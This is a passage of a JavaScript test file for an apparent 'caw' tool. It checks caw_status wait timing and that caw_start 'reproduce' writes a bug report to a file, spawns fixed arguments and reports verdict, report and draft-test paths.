    const log = join(root, '.caw', 'session-2026-11-11T12-00-00-000Z.log');
    writeFileSync(log, '[caw] Spiele die Aufzeichnung ab ...\n');
    // A live process stands in for the run.
    writeFileSync(`${log}.pid`, String(process.pid));

    const started = Date.now();
    setTimeout(() => writeFileSync(log, '[+1.0s] 2/16 click button "Save"\n', { flag: 'a' }), 100);
    setTimeout(() => writeFileSync(log, '[caw] bestellung auf local: fail\n', { flag: 'a' }), 400);
    const changed = await call('caw_status', { wait: 10 });
    const waited = Date.now() - started;
    assert.ok(waited >= 380 && waited < 5000, `waited ${waited} ms`);
    assert.match(changed.content[0].text, /bestellung auf local: fail/);
    assert.equal(changed.structuredContent.state, 'running');

    const quiet = Date.now();
    await call('caw_status', { wait: 1 });
    assert.ok(Date.now() - quiet >= 950, 'waits the full second without a change');

    const instant = Date.now();
    await call('caw_status');
    assert.ok(Date.now() - instant < 500, 'without wait it answers at once');
});

test('caw_start reproduce: the bug report goes into a file, the session is the agent; caw_status names verdict, report and draft', async (t) => {
    const root = project(t);
    const { call, spawned } = session(root);
    const started = await call('caw_start', { command: 'reproduce', bug: '--Nach dem Speichern\r\nfehlt der Eintrag.', from: 'bestellung@S2' });
    assert.equal(started.isError, false);
    assert.deepEqual(spawned[0].args.slice(1, -1), ['reproduce', '--file', '.caw/reproduce-bug.md', '--from', 'bestellung@S2']);
    assert.match(spawned[0].args.at(-1), /^--attach=[a-z0-9]{4}$/);
    assert.equal(readFileSync(join(root, '.caw', 'reproduce-bug.md'), 'utf8'), '--Nach dem Speichern\nfehlt der Eintrag.');

    const runDir = join(root, '.caw', 'runs', '2026-11-18T12-00-00-000Z-reproduce');
    mkdirSync(runDir, { recursive: true });
    const draft = { from: '.caw/runs/2026-11-18T12-00-00-000Z-reproduce/draft-test.yaml', to: 'caw/tests/bug-x.yaml', record: 'caw record bug-x' };
    writeFileSync(join(runDir, 'result.json'), JSON.stringify({ status: 'pass', reproduce: { bug: 'x', reproduced: 'yes', observed: 'o', expected: 'e', draft } }));
    for (const name of ['report.md', 'draft-test.yaml']) writeFileSync(join(runDir, name), '');
    writeFileSync(join(root, '.caw', 'last-run.json'), JSON.stringify({ runId: '2026-11-18T12-00-00-000Z-reproduce', runDir, pid: 1, command: 'reproduce', test: 'reproduce', target: 'local', startedAt: new Date().toISOString() }));
    const data = (await call('caw_status')).structuredContent;
    assert.deepEqual(data.reproduce, { reproduced: 'yes', observed: 'o', expected: 'e', report: '.caw/runs/2026-11-18T12-00-00-000Z-reproduce/report.md', draft: draft.from, adopt: { copyTo: draft.to, then: draft.record } });
    assert.ok(data.artefacts.includes('.caw/runs/2026-11-18T12-00-00-000Z-reproduce/draft-test.yaml'));
});
